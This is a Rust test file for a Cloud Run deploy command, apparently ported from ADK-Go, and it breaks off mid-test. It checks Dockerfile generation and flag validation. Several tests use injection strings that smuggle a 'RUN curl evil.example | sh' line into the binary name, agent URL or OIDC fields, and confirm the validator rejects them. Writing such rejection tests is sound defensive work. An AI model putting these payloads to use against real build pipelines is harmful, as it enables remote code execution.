// Copyright 2026 Chris Olson
// Portions derived from ADK-Go (https://github.com/google/adk-go), Copyright 2026 Google LLC.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! Port of ADK-Go `cmd/adkgo/internal/deploy/cloudrun/cloudrun_test.go`.
//!
//! Go's tests mutate the package global `flags` (`resetFlags`) and parse into it with
//! `cloudrunCmd.ParseFlags`; here each test owns a [`CloudRunFlags`] built by
//! [`Workspace::flags`] (Go's `resetFlags`: the zero value plus entry point, temp parent and
//! A2A URL) or by [`from_matches`] on the real clap command (which applies Go's `PreRunE`).
//! `compute_flags` resolves a Cargo target where Go splits a `main.go` path, so every test
//! that reaches that point runs in a fixture workspace whose canned `cargo metadata` names
//! the binary Go derived from the path (`main`, `agenté`, an unsafe or whitespace name).

use std::fs;

use pretty_assertions::assert_eq;

use crate::deploy::cloudrun::fixture::{Workspace, cmd_args, receiver};
use crate::deploy::cloudrun::{
    CloudRunFlags, TriggerConfigFlags, check_trigger_oidc_emitted, command, from_matches,
    validate_trigger_oidc,
};
use crate::testutil::TestEnv;
use gadk_platform::{GoDuration, go_quote};

/// Go `allowListRejection`: the part of `ValidateShellArgSafe`'s rejection no other
/// validator produces.
const ALLOW_LIST_REJECTION: &str =
    "whitespace splits COPY operands and shell metacharacters are live in a RUN line";

/// Go `dockerfileRejection`: the part of `ValidateDockerfileSafe`'s message for a disallowed
/// character no other check produces.
const DOCKERFILE_REJECTION: &str = "(quote, backtick, backslash, or a control character)";

const AGENT_URL: &str = "http://127.0.0.1:8081";

/// A test case's change to the flags (Go: `set func(*deployCloudRunFlags)`).
type Set = fn(&mut CloudRunFlags);

/// Go `cloudrunCmd.ParseFlags(args)` + `PreRunE`: the flags of the real command.
fn parse_flags(args: &[&str]) -> CloudRunFlags {
    let m = command()
        .try_get_matches_from(std::iter::once("cloudrun").chain(args.iter().copied()))
        .unwrap_or_else(|e| panic!("ParseFlags({args:?}) = {e}"));
    from_matches(&m)
}

/// Go `resetFlags` applied after a parse: the fixture's entry point (the workspace root, the
/// test env's working directory) and temp parent.
fn parse_flags_in(ws: &Workspace, args: &[&str]) -> CloudRunFlags {
    let mut f = parse_flags(args);
    f.source.entry_point_path = String::new();
    f.build.temp_dir = ws.temp_parent().to_string_lossy().into_owned();
    f
}

/// A fixture workspace whose root package has the one binary `main` (Go's `main.go`).
fn main_workspace() -> Workspace {
    Workspace::new("", "agent", &["main"])
}

/// Go `setValidTriggerOIDCPairs`.
fn set_valid_trigger_oidc_pairs(f: &mut CloudRunFlags) {
    f.cloud_run.pubsub = true;
    f.cloud_run.eventarc = true;
    f.cloud_run.pubsub_trigger.oidc_audience = "https://svc.run.app".into();
    f.cloud_run.pubsub_trigger.oidc_service_accounts = "a@p.iam.gserviceaccount.com".into();
    f.cloud_run.eventarc_trigger.oidc_audience = "https://svc.run.app".into();
    f.cloud_run.eventarc_trigger.oidc_service_accounts = "b@p.iam.gserviceaccount.com".into();
}

// parity: adapted: the unsafe executable name is the binary target name in the canned cargo metadata of the package -e names (Go: the basename of a main.go path, .go stripped)
#[tokio::test]
async fn test_compute_flags_rejects_unsafe_entry_point_basename() {
    // The benign directory component tells the raw flag value from the derived name.
    let malicious_bin = "main\"\nRUN curl evil.example | sh\n#";
    let ws = Workspace::new("cmd/quickstart", "agent", &[malicious_bin]);
    let t = ws.env();
    let mut f = ws.flags("cmd/quickstart", AGENT_URL);

    let err = f.compute_flags(&t.env).await.expect_err(
        "computeFlags() = nil, want an error rejecting the unsafe entry point basename",
    );
    assert!(
        err.contains(ALLOW_LIST_REJECTION),
        "computeFlags() error = {err}, want the allow-list rejection {ALLOW_LIST_REJECTION:?}"
    );
    let want = format!(
        "derived from --entry_point_path {}",
        go_quote("cmd/quickstart")
    );
    assert!(
        err.contains(&want),
        "computeFlags() error = {err}, want it to contain {want}"
    );
}

#[tokio::test]
async fn test_compute_flags_rejects_unsafe_a2_a_agent_card_url() {
    let malicious_url = "http://127.0.0.1:8081\"]\nRUN curl evil.example | sh\n#";
    let ws = main_workspace();
    let t = ws.env();
    let mut f = ws.flags("", malicious_url);

    let err = f.compute_flags(&t.env).await.expect_err(
        "computeFlags() = nil, want an error rejecting the unsafe --a2a_agent_url value",
    );
    assert!(
        err.contains("a2a_agent_url"),
        "computeFlags() error = {err}, want it to mention --a2a_agent_url"
    );
}

#[tokio::test]
async fn test_compute_flags_rejects_unsafe_service_name() {
    for name in ["--flags-file=/tmp/evil.yaml", "-s", "-agent"] {
        let ws = main_workspace();
        let t = ws.env();
        let mut f = ws.flags("", AGENT_URL);
        f.cloud_run.service_name = name.into();
        assert!(
            f.compute_flags(&t.env).await.is_err(),
            "computeFlags() with serviceName {name:?} = nil, want an error"
        );
    }
}

// parity: adapted: the entry point is the fixture workspace's package (binary `main`) instead of main.go
#[tokio::test]
async fn test_compute_flags_accepts_service_names() {
    for name in [
        "my-agent",
        "a",
        "9agent",
        "projects/my-project/locations/us-central1/services/my-agent",
    ] {
        let ws = main_workspace();
        let t = ws.env();
        let mut f = ws.flags("", AGENT_URL);
        f.cloud_run.service_name = name.into();
        if let Err(err) = f.compute_flags(&t.env).await {
            panic!("computeFlags() with serviceName {name:?} = {err}, want nil");
        }
    }
}

// parity: adapted: the entry point is the fixture workspace's package (binary `main`) instead of main.go
#[tokio::test]
async fn test_compute_flags_accepts_benign_values() {
    let ws = main_workspace();
    let t = ws.env();
    let mut f = ws.flags("", AGENT_URL);

    if let Err(err) = f.compute_flags(&t.env).await {
        panic!("computeFlags() = {err}, want no error for benign values");
    }
    assert_eq!(f.build.exec_file, "main", "execFile");
    assert!(
        f.build
            .exec_path
            .starts_with(&format!("{}/", f.build.temp_dir)),
        "execPath = {:?}, want it inside the created temp dir {:?}",
        f.build.exec_path,
        f.build.temp_dir
    );
}

// parity: adapted: the non-ASCII executable name is the binary target `agenté` of the package at agentes/café (Go: agentes/café/agenté.go)
#[tokio::test]
async fn test_compute_flags_accepts_non_ascii_entry_point() {
    let ws = Workspace::new("agentes/café", "agentes", &["agenté"]);
    let t = ws.env();
    let mut f = ws.flags("agentes/café", AGENT_URL);

    if let Err(err) = f.compute_flags(&t.env).await {
        panic!("computeFlags() = {err}, want no error for a non-ASCII entry point path");
    }
    assert_eq!(f.build.exec_file, "agenté", "execFile");
}

// parity: adapted: the whitespace is in the binary target names of the canned cargo metadata (Go: in the main.go basename)
#[tokio::test]
async fn test_compute_flags_rejects_whitespace_in_exec_file() {
    for bin in ["my agent", "my\tagent"] {
        let ws = Workspace::new("", "agent", &[bin]);
        let t = ws.env();
        let mut f = ws.flags("", AGENT_URL);

        assert!(
            f.compute_flags(&t.env).await.is_err(),
            "computeFlags() with binary {bin:?} = nil, want an error: the COPY operands would not survive whitespace"
        );
    }
}

// parity: adapted: the "no .go extension" case is "package without a binary" (gadk's target resolution); the cases run in a fixed order
#[tokio::test]
async fn test_compute_flags_rejection_leaves_no_temp_dir() {
    let cases: [(&str, &[&str], &str, Option<Set>); 10] = [
        (
            "unsafe entry point",
            &["main\"\nRUN curl evil.example | sh\n#"],
            AGENT_URL,
            None,
        ),
        (
            "unsafe a2a url",
            &["main"],
            "http://127.0.0.1:8081\"]\nRUN curl evil.example | sh\n#",
            None,
        ),
        ("package without a binary", &[], AGENT_URL, None),
        (
            "unsafe oidc value",
            &["main"],
            AGENT_URL,
            Some(|f| {
                set_valid_trigger_oidc_pairs(f);
                f.cloud_run.eventarc_trigger.oidc_service_accounts =
                    "x\"]\nRUN curl evil.example | sh\n#".into();
            }),
        ),
        (
            "lone oidc flag",
            &["main"],
            AGENT_URL,
            Some(|f| f.cloud_run.eventarc_trigger.oidc_audience = "https://svc.run.app".into()),
        ),
        (
            "padded oidc audience",
            &["main"],
            AGENT_URL,
            Some(|f| {
                set_valid_trigger_oidc_pairs(f);
                f.cloud_run.eventarc_trigger.oidc_audience = "https://svc.run.app ".into();
            }),
        ),
        (
            "empty oidc service account entry",
            &["main"],
            AGENT_URL,
            Some(|f| {
                set_valid_trigger_oidc_pairs(f);
                f.cloud_run.eventarc_trigger.oidc_service_accounts =
                    "a@p.iam.gserviceaccount.com,".into();
            }),
        ),
        (
            "oidc pair for a disabled trigger",
            &["main"],
            AGENT_URL,
            Some(|f| {
                set_valid_trigger_oidc_pairs(f);
                f.cloud_run.eventarc = false;
            }),
        ),
        (
            "oidc value that is a flag",
            &["main"],
            AGENT_URL,
            Some(|f| {
                set_valid_trigger_oidc_pairs(f);
                f.cloud_run.pubsub_trigger.oidc_audience = "--eventarc_oidc_audience".into();
            }),
        ),
        (
            "oidc flag passed empty",
            &["main"],
            AGENT_URL,
            Some(|f| {
                f.cloud_run.eventarc = true;
                f.cloud_run.eventarc_trigger.oidc_audience_passed = true;
                f.cloud_run.eventarc_trigger.oidc_service_accounts_passed = true;
            }),
        ),
    ];
    for (name, bins, agent_url, set) in cases {
        let ws = Workspace::new("", "agent", bins);
        let t = ws.env();
        let mut f = ws.flags("", agent_url);
        if let Some(set) = set {
            set(&mut f);
        }
        let parent = ws.temp_parent();

        assert!(
            f.compute_flags(&t.env).await.is_err(),
            "{name}: computeFlags() = nil, want an error"
        );
        let entries: Vec<_> = fs::read_dir(&parent)
            .unwrap_or_else(|e| panic!("{name}: cannot read the temp dir parent: {e}"))
            .map(|e| e.map(|e| e.file_name()))
            .collect();
        assert!(
            entries.is_empty(),
            "{name}: rejected invocation left {entries:?} behind in the temp dir parent"
        );
    }
}

// parity: adapted: no package global exists; two receivers (Go's receiver and Go's global values) each generate a Dockerfile, and each must carry only its own values; the runtime COPY is the builder-stage copy
#[tokio::test]
async fn test_prepare_dockerfile_reads_receiver_not_global() {
    const RECEIVER_PORT: i64 = 9091;
    const RECEIVER_URL: &str = "http://127.0.0.1:9099";
    const PROXY_PORT: i64 = 9098;

    // Go's global: a different port, URL, executable name and proxy port, every optional
    // block off.
    let other_dir = tempfile::tempdir().unwrap();
    let mut other = receiver(other_dir.path(), "other");
    other.cloud_run.server_port = 8080;
    other.cloud_run.a2a_agent_card_url = AGENT_URL.into();
    other.proxy.port = 8000;

    // Every optional block on, each with a value the other receiver does not hold.
    let dir = tempfile::tempdir().unwrap();
    let mut f = receiver(dir.path(), "main");
    f.cloud_run.server_port = RECEIVER_PORT;
    f.proxy.port = PROXY_PORT;
    f.cloud_run.a2a = true;
    f.cloud_run.a2a_agent_card_url = RECEIVER_URL.into();
    f.cloud_run.api = true;
    f.cloud_run.debug_api = true;
    f.cloud_run.webui = true;
    f.cloud_run.pubsub = true;
    f.cloud_run.pubsub_trigger = TriggerConfigFlags {
        max_retries: 11,
        base_delay: GoDuration(2 * GoDuration::SECOND.0),
        max_delay: GoDuration(33 * GoDuration::SECOND.0),
        max_runs: 44,
        ..TriggerConfigFlags::default()
    };
    f.cloud_run.eventarc = true;
    f.cloud_run.eventarc_trigger = TriggerConfigFlags {
        max_retries: 55,
        base_delay: GoDuration(6 * GoDuration::SECOND.0),
        max_delay: GoDuration(47 * GoDuration::SECOND.0),
        max_runs: 88,
        ..TriggerConfigFlags::default()
    };
    let t = TestEnv::builder(dir.path()).build();

    other.prepare_dockerfile(&t.env).await.unwrap();
    if let Err(err) = f.prepare_dockerfile(&t.env).await {
        panic!("prepareDockerfile() = {err}, want no error");
    }
    let content = fs::read_to_string(&f.build.dockerfile_build_path)
        .unwrap_or_else(|e| panic!("cannot read the generated Dockerfile: {e}"));
    let other_content = fs::read_to_string(&other.build.dockerfile_build_path).unwrap();

    assert!(
        content.contains("\nEXPOSE 9091\n"),
        "Dockerfile does not EXPOSE the receiver's server port:\n{content}"
    );
    assert!(
        content.contains(RECEIVER_URL),
        "Dockerfile does not carry the receiver's --a2a_agent_url:\n{content}"
    );
    assert!(
        content.contains("\nCOPY --from=builder /gadk-target/release/main  /app/main\n"),
        "Dockerfile does not COPY the receiver's execFile:\n{content}"
    );
    assert!(
        content.contains(r#"["/app/main", "web""#),
        "Dockerfile CMD does not run the receiver's execFile:\n{content}"
    );
    for (name, want) in [
        (
            "api",
            r#", "api", "-webui_address", "127.0.0.1:9098", "-include_debug_api""#,
        ),
        (
            "webui",
            r#", "webui", "--api_server_address", "http://127.0.0.1:9098/api""#,
        ),
        (
            "pubsub",
            r#", "pubsub", "--trigger_max_retries", "11", "--trigger_base_delay", "2s", "--trigger_max_delay", "33s", "--trigger_max_concurrent_runs", "44""#,
        ),
        (
            "eventarc",
            r#", "eventarc", "--trigger_max_retries", "55", "--trigger_base_delay", "6s", "--trigger_max_delay", "47s", "--trigger_max_concurrent_runs", "88""#,
        ),
    ] {
        assert!(
            content.contains(want),
            "Dockerfile CMD does not carry the receiver's {name} block {want}:\n{content}"
        );
    }
    for leak in ["EXPOSE 8080", "/app/other", "127.0.0.1:8000", AGENT_URL] {
        assert!(
            !content.contains(leak),
            "Dockerfile carries the other receiver's {leak}:\n{content}"
        );
    }
    assert!(
        other_content.contains("\nEXPOSE 8080\n")
            && other_content.contains(r#"["/app/other", "web""#),
        "the other receiver's Dockerfile:\n{other_content}"
    );
    for block in [
        r#", "api""#,
        r#", "a2a""#,
        r#", "webui""#,
        r#", "pubsub""#,
        r#", "eventarc""#,
    ] {
        assert!(
            !other_content.contains(block),
            "the other receiver's Dockerfile carries {block}:\n{other_content}"
        );
    }
}

// parity: adapted: the entry point is the fixture workspace's package (binary `main`) instead of main.go
#[tokio::test]
async fn test_prepare_dockerfile_a2_aurl_reaches_cmd_array() {
    let ws = main_workspace();
    let t = ws.env();
    let mut f = ws.flags("", AGENT_URL);
    f.cloud_run.a2a = true;
    f.cloud_run.server_port = 8080;

    if let Err(err) = f.compute_flags(&t.env).await {
        panic!("computeFlags() = {err}, want no error");
    }
    if let Err(err) = f.prepare_dockerfile(&t.env).await {
        panic!("prepareDockerfile() = {err}, want no error");
    }

    let content = fs::read_to_string(&f.build.dockerfile_build_path)
        .unwrap_or_else(|e| panic!("cannot read the generated Dockerfile: {e}"));
    let args = cmd_args(&content);
    assert!(
        args.iter().any(|a| a == AGENT_URL),
        "CMD args = {args:?}, want them to carry {AGENT_URL:?}"
    );
}

// parity: adapted: the entry point is the fixture workspace's package (binary `main`) instead of main.go
#[tokio::test]
async fn test_prepare_dockerfile_binds_all_interfaces() {
    let ws = main_workspace();
    let t = ws.env();
    let mut f = ws.flags("", "");
    f.cloud_run.server_port = 8080;

    if let Err(err) = f.compute_flags(&t.env).await {
        panic!("computeFlags() = {err}, want no error");
    }
    if let Err(err) = f.prepare_dockerfile(&t.env).await {
        panic!("prepareDockerfile() = {err}, want no error");
    }

    let content = fs::read_to_string(&f.build.dockerfile_build_path)
        .unwrap_or_else(|e| panic!("cannot read the generated Dockerfile: {e}"));
    let args = cmd_args(&content);
    let mut host = "";
    for (i, arg) in args.iter().enumerate() {
        if arg == "-host" && i + 1 < args.len() {
            host = &args[i + 1];
        }
    }
    assert_eq!(
        host, "0.0.0.0",
        "CMD args = {args:?}, want -host 0.0.0.0 so Cloud Run can reach the server"
    );
    assert!(
        args.iter().any(|a| a == "8080"),
        "CMD args = {args:?}, want them to carry the server port \"8080\""
    );
}

// parity: adapted: the receiver carries a resolved Cargo target (the builder stage needs its package)
#[tokio::test]
async fn test_prepare_dockerfile_forwards_trigger_oidc_flags() {
    let dir = tempfile::tempdir().unwrap();
    let mut f = receiver(dir.path(), "main");
    f.cloud_run.pubsub = true;
    f.cloud_run.pubsub_trigger = TriggerConfigFlags {
        max_retries: 1,
        max_delay: GoDuration::SECOND,
        max_runs: 1,
        oidc_audience: "https://Svc.run.app/api/apps/A/trigger/pubsub".into(),
        oidc_service_accounts: "Push@p.iam.gserviceaccount.com".into(),
        ..TriggerConfigFlags::default()
    };
    f.cloud_run.eventarc = true;
    f.cloud_run.eventarc_trigger = TriggerConfigFlags {
        max_retries: 1,
        max_delay: GoDuration::SECOND,
        max_runs: 1,
        oidc_audience: "https://svc.run.app".into(),
        oidc_service_accounts: "a@p.iam.gserviceaccount.com,B@p.iam.gserviceaccount.com".into(),
        ..TriggerConfigFlags::default()
    };
    let t = TestEnv::builder(dir.path()).build();

    if let Err(err) = f.prepare_dockerfile(&t.env).await {
        panic!("prepareDockerfile() = {err}, want no error");
    }
    let content = fs::read_to_string(&f.build.dockerfile_build_path)
        .unwrap_or_else(|e| panic!("cannot read the generated Dockerfile: {e}"));
    // Each pair must follow its own sublauncher keyword.
    for want in [
        r#""--trigger_max_concurrent_runs", "1", "-oidc_audience", "https://Svc.run.app/api/apps/A/trigger/pubsub", "-oidc_service_accounts", "Push@p.iam.gserviceaccount.com", "eventarc""#,
        r#""--trigger_max_concurrent_runs", "1", "-oidc_audience", "https://svc.run.app", "-oidc_service_accounts", "a@p.iam.gserviceaccount.com,B@p.iam.gserviceaccount.com"]"#,
    ] {
        assert!(
            content.contains(want),
            "Dockerfile CMD does not carry {want}:\n{content}"
        );
    }
}

// parity: adapted: the receiver carries a resolved Cargo target (the builder stage needs its package)
#[tokio::test]
async fn test_prepare_dockerfile_omits_unset_trigger_oidc_flags() {
    let dir = tempfile::tempdir().unwrap();
    let mut f = receiver(dir.path(), "main");
    f.cloud_run.pubsub = true;
    f.cloud_run.eventarc = true;
    let t = TestEnv::builder(dir.path()).build();

    if let Err(err) = f.prepare_dockerfile(&t.env).await {
        panic!("prepareDockerfile() = {err}, want no error");
    }
    let content = fs::read_to_string(&f.build.dockerfile_build_path)
        .unwrap_or_else(|e| panic!("cannot read the generated Dockerfile: {e}"));
    assert!(
        !content.contains("oidc"),
        "Dockerfile carries OIDC flags that were never set:\n{content}"
    );
}

#[tokio::test]
async fn test_compute_flags_rejects_unsafe_trigger_oidc_values() {
    const PAYLOAD: &str = "x\"]\nRUN curl evil.example | sh\n#";
    let cases: [(&str, Set); 4] = [
        ("--pubsub_oidc_audience", |f| {
            f.cloud_run.pubsub_trigger.oidc_audience = PAYLOAD.into()
        }),
        ("--pubsub_oidc_service_accounts", |f| {
            f.cloud_run.pubsub_trigger.oidc_service_accounts = PAYLOAD.into()
        }),
        ("--eventarc_oidc_audience", |f| {
            f.cloud_run.eventarc_trigger.oidc_audience = PAYLOAD.into()
        }),
        ("--eventarc_oidc_service_accounts", |f| {
            f.cloud_run.eventarc_trigger.oidc_service_accounts = PAYLOAD.into()
        }),
    ];
    for (flag, set) in cases {
        let ws = main_workspace();
        let t = ws.env();
        let mut f = ws.flags("", AGENT_URL);
        // Complete pairs, so the both-or-neither check cannot answer for the Dockerfile check.
        set_valid_trigger_oidc_pairs(&mut f);
        set(&mut f);

        let err = f.compute_flags(&t.env).await.unwrap_err();
        assert!(
            err.contains(flag) && err.contains(DOCKERFILE_REJECTION),
            "{flag}: computeFlags() error = {err}, want the Dockerfile-safety rejection of {flag}"
        );
    }
}

#[tokio::test]
async fn test_compute_flags_rejects_lone_trigger_oidc_flag() {
    let cases: [(&str, Set, &str); 4] = [
        (
            "pubsub audience only",
            |f| f.cloud_run.pubsub_trigger.oidc_audience = "https://svc.run.app".into(),
            "--pubsub_oidc_service_accounts",
        ),
        (
            "pubsub service accounts only",
            |f| {
                f.cloud_run.pubsub_trigger.oidc_service_accounts =
                    "a@p.iam.gserviceaccount.com".into()
            },
            "--pubsub_oidc_audience",
        ),
        (
            "eventarc audience only",
            |f| f.cloud_run.eventarc_trigger.oidc_audience = "https://svc.run.app".into(),
            "--eventarc_oidc_service_accounts",
        ),
        (
            "eventarc service accounts only",
            |f| {
                f.cloud_run.eventarc_trigger.oidc_service_accounts =
                    "a@p.iam.gserviceaccount.com".into()
            },
            "--eventarc_oidc_audience",
        ),
    ];
    for (name, set, want) in cases {
        let ws = main_workspace();
        let t = ws.env();
        let mut f = ws.flags("", AGENT_URL);
        f.cloud_run.pubsub = true;
        f.cloud_run.eventarc = true;
        set(&mut f);

        let err = f.compute_flags(&t.env).await.unwrap_err();
        assert!(
            err.contains(want),
            "{name}: computeFlags() error = {err}, want it to name {want}"
        );
    }
}

#[tokio::test]
async fn test_compute_flags_rejects_trigger_oidc_values_the_sublauncher_refuses() {
    let cases: [(&str, Set, &str); 5] = [
        (
            "pubsub audience with trailing space",
            |f| f.cloud_run.pubsub_trigger.oidc_audience = "https://svc.run.app ".into(),
            "--pubsub_oidc_audience",
        ),
        (
            "eventarc audience with leading space",
            |f| f.cloud_run.eventarc_trigger.oidc_audience = " https://svc.run.app".into(),
            "--eventarc_oidc_audience",
        ),
        (
            "pubsub trailing comma",
            |f| {
                f.cloud_run.pubsub_trigger.oidc_service_accounts =
                    "a@p.iam.gserviceaccount.com,".into()
            },
            "--pubsub_oidc_service_accounts",
        ),
        (
            "eventarc blank middle entry",
            |f| {
                f.cloud_run.eventarc_trigger.oidc_service_accounts =
                    "a@p.iam.gserviceaccount.com, ,b@p.iam.gserviceaccount.com".into()
            },
            "--eventarc_oidc_service_accounts",
        ),
        (
            "pubsub only a space",
            |f| f.cloud_run.pubsub_trigger.oidc_service_accounts = " ".into(),
            "--pubsub_oidc_service_accounts",
        ),
    ];
    for (name, set, want) in cases {
        let ws = main_workspace();
        let t = ws.env();
        let mut f = ws.flags("", AGENT_URL);
        set_valid_trigger_oidc_pairs(&mut f);
        set(&mut f);

        let err = f.compute_flags(&t.env).await.unwrap_err();
        assert!(
            err.contains(want),
            "{name}: computeFlags() error = {err}, want it to name {want}"
        );
    }
}

/// Go `triggerFlagAlphabet`: letters of both cases, the list separator, the flag prefix, and
/// four characters `strings.TrimSpace` removes (space, tab, U+00A0 and U+3000).
const TRIGGER_FLAG_ALPHABET: [&str; 8] = ["a", "B", ",", "-", " ", "\t", "\u{a0}", "\u{3000}"];

/// Go `isReferenceSpace`.
fn is_reference_space(r: char) -> bool {
    r == ' ' || r == '\t' || r == '\u{a0}' || r == '\u{3000}'
}

/// Go `allStrings`: every string of zero to `n` symbols from `alphabet`.
fn all_strings(alphabet: &[&str], n: usize) -> Vec<String> {
    let mut out = vec![String::new()];
    let mut last = vec![String::new()];
    for _ in 0..n {
        let mut next = Vec::new();
        for prefix in &last {
            for c in alphabet {
                next.push(format!("{prefix}{c}"));
            }
        }
        out.extend(next.iter().cloned());
        last = next;
    }
    out
}

/// Go `referenceAccepts`: what a deploy may forward, stated independently of
/// `validate_trigger_oidc`.
fn reference_accepts(audience: &str, accounts: &str) -> bool {
    if audience
        .chars()
        .chain(accounts.chars())
        .any(|r| r < '\u{20}')
    {
        return false;
    }
    if audience.is_empty() && accounts.is_empty() {
        return true;
    }
    if audience.is_empty() || accounts.is_empty() {
        return false;
    }
    let aud: Vec<char> = audience.chars().collect();
    if is_reference_space(aud[0]) || is_reference_space(aud[aud.len() - 1]) || aud[0] == '-' {
        return false;
    }
    // `first` is the entry's first non-space rune, None until there is one.
    let mut first: Option<char> = None;
    for r in accounts.chars().chain(std::iter::once(',')) {
        if r == ',' {
            if first.is_none() || first == Some('-') {
                return false;
            }
            first = None;
        } else if first.is_none() && !is_reference_space(r) {
            first = Some(r);
        }
    }
    true
}

#[test]
fn test_validate_trigger_oidc_matches_reference() {
    let lists = all_strings(&TRIGGER_FLAG_ALPHABET, 4);
    let mut audiences = all_strings(&TRIGGER_FLAG_ALPHABET, 2);
    audiences.extend(
        ["a B", "a\tB", "a\u{a0}B", "a\u{3000}B"]
            .iter()
            .map(|s| s.to_string()),
    );
    for audience in &audiences {
        for accounts in &lists {
            let t = TriggerConfigFlags {
                oidc_audience: audience.clone(),
                oidc_service_accounts: accounts.clone(),
                ..TriggerConfigFlags::default()
            };
            let err = validate_trigger_oidc("pubsub", &t);
            let want = reference_accepts(audience, accounts);
            assert_eq!(
                err.is_ok(),
                want,
                "validateTriggerOIDC({audience:?}, {accounts:?}) = {err:?}, want accepted = {want}"
            );
        }
    }
}

// parity: adapted: the real clap command parses into a fresh CloudRunFlags (from_matches applies PreRunE); the fixture's entry point and temp parent are then set on it
#[tokio::test]
async fn test_compute_flags_accepts_complete_trigger_oidc_pairs() {
    let ws = main_workspace();
    let t = ws.env();
    let mut f = parse_flags_in(
        &ws,
        &[
            "--pubsub",
            "--eventarc",
            "--pubsub_oidc_audience",
            "https://svc.run.app",
            "--pubsub_oidc_service_accounts",
            "a@p.iam.gserviceaccount.com",
            "--eventarc_oidc_audience=https://svc.run.app",
            // The sublauncher trims each entry, so spaces around one are fine.
            "--eventarc_oidc_service_accounts=b@p.iam.gserviceaccount.com , c@p.iam.gserviceaccount.com",
        ],
    );

    if let Err(err) = f.compute_flags(&t.env).await {
        panic!("computeFlags() = {err}, want no error");
    }
}

#[tokio::test]
async fn test_compute_flags_reports_unsafe_trigger_oidc_values_in_fixed_order() {
    const PAYLOAD: &str = "x\"";
    for _ in 0..20 {
        let ws = main_workspace();
        let t = ws.env();
        let mut f = ws.flags("", AGENT_URL);
        f.cloud_run.pubsub_trigger.oidc_audience = PAYLOAD.into();
        f.cloud_run.pubsub_trigger.oidc_service_accounts = PAYLOAD.into();
        f.cloud_run.eventarc_trigger.oidc_audience = PAYLOAD.into();
        f.cloud_run.eventarc_trigger.oidc_service_accounts = PAYLOAD.into();

        let err = f.compute_flags(&t.env).await;
        assert!(
            matches!(&err, Err(e) if e.contains("--pubsub_oidc_audience")),
            "computeFlags() error = {err:?}, want it to name --pubsub_oidc_audience first"
        );
    }
}

// parity: adapted: the real clap command parses into a fresh CloudRunFlags (Go: into the package global)
#[test]
fn test_cloud_run_command_binds_trigger_oidc_flags() {
    let f = parse_flags(&[
        "--pubsub_oidc_audience=pubsub-aud",
        "--pubsub_oidc_service_accounts=pubsub-sa",
        "--eventarc_oidc_audience=eventarc-aud",
        "--eventarc_oidc_service_accounts=eventarc-sa",
    ]);

    for (name, got, want) in [
        (
            "pubsub audience",
            &f.cloud_run.pubsub_trigger.oidc_audience,
            "pubsub-aud",
        ),
        (
            "pubsub service accounts",
            &f.cloud_run.pubsub_trigger.oidc_service_accounts,
            "pubsub-sa",
        ),
        (
            "eventarc audience",
            &f.cloud_run.eventarc_trigger.oidc_audience,
            "eventarc-aud",
        ),
        (
            "eventarc service accounts",
            &f.cloud_run.eventarc_trigger.oidc_service_accounts,
            "eventarc-sa",
        ),
    ] {
        assert_eq!(got, want, "{name}");
    }
}

#[tokio::test]
async fn test_compute_flags_rejects_trigger_oidc_flags_for_a_disabled_trigger() {
    let cases: [(&str, Set, &str); 2] = [
        (
            "pubsub pair, eventarc enabled",
            |f| {
                f.cloud_run.eventarc = true;
                f.cloud_run.pubsub_trigger.oidc_audience = "https://svc.run.app".into();
                f.cloud_run.pubsub_trigger.oidc_service_accounts =
                    "a@p.iam.gserviceaccount.com".into();
            },
            "require --pubsub",
        ),
        (
            "eventarc pair, pubsub enabled",
            |f| {
                f.cloud_run.pubsub = true;
                f.cloud_run.eventarc_trigger.oidc_audience = "https://svc.run.app".into();
                f.cloud_run.eventarc_trigger.oidc_service_accounts =
                    "a@p.iam.gserviceaccount.com".into();
            },
            "require --eventarc",
        ),
    ];
    for (name, set, want) in cases {
        let ws = main_workspace();
        let t = ws.env();
        let mut f = ws.flags("", AGENT_URL);
        set(&mut f);

        let err = f.compute_flags(&t.env).await;
        assert!(
            matches!(&err, Err(e) if e.contains(want)),
            "{name}: computeFlags() = {err:?}, want an error containing {want:?}"
        );
    }
}

#[tokio::test]
async fn test_compute_flags_rejects_trigger_oidc_flag_passed_empty() {
    let cases: [(&str, Set, &str); 5] = [
        (
            "pubsub pair",
            |f| {
                f.cloud_run.pubsub_trigger.oidc_audience_passed = true;
                f.cloud_run.pubsub_trigger.oidc_service_accounts_passed = true;
            },
            "--pubsub_oidc_audience is empty",
        ),
        (
            "pubsub service accounts",
            |f| f.cloud_run.pubsub_trigger.oidc_service_accounts_passed = true,
            "--pubsub_oidc_service_accounts is empty",
        ),
        (
            "pubsub service accounts beside an audience",
            |f| {
                f.cloud_run.pubsub_trigger.oidc_audience = "https://svc.run.app".into();
                f.cloud_run.pubsub_trigger.oidc_audience_passed = true;
                f.cloud_run.pubsub_trigger.oidc_service_accounts_passed = true;
            },
            "--pubsub_oidc_service_accounts is empty",
        ),
        (
            "eventarc pair",
            |f| {
                f.cloud_run.eventarc_trigger.oidc_audience_passed = true;
                f.cloud_run.eventarc_trigger.oidc_service_accounts_passed = true;
            },
            "--eventarc_oidc_audience is empty",
        ),
        (
            "eventarc service accounts",
            |f| f.cloud_run.eventarc_trigger.oidc_service_accounts_passed = true,
            "--eventarc_oidc_service_accounts is empty",
        ),
    ];
    for (name, set, want) in cases {
        let ws = main_workspace();
        let t = ws.env();
        let mut f = ws.flags("", AGENT_URL);
        f.cloud_run.pubsub = true;
        f.cloud_run.eventarc = true;
        set(&mut f);

        let err = f.compute_flags(&t.env).await;
        assert!(
            matches!(&err, Err(e) if e.contains(want)),
            "{name}: computeFlags() = {err:?}, want an error containing {want:?}"
        );
    }
}

// parity: adapted: the real clap command parses into a fresh CloudRunFlags (from_matches applies PreRunE)
#[test]
fn test_cloud_run_command_records_passed_trigger_oidc_flags() {
    let cases: [(&[&str], [bool; 4]); 5] = [
        // One flag at a time, so a typo or a swap of any two names fails.
        (&["--pubsub_oidc_audience="], [true, false, false, false]),
        (
            &["--pubsub_oidc_service_accounts="],
            [false, true, false, false],
        ),
        (&["--eventarc_oidc_audience="], [false, false, true, false]),
        (
            &["--eventarc_oidc_service_accounts="],
            [false, false, false, true],
        ),
        (
            &[
                "--pubsub_oidc_audience=",
                "--pubsub_oidc_service_accounts=",
                "--eventarc_oidc_audience=",
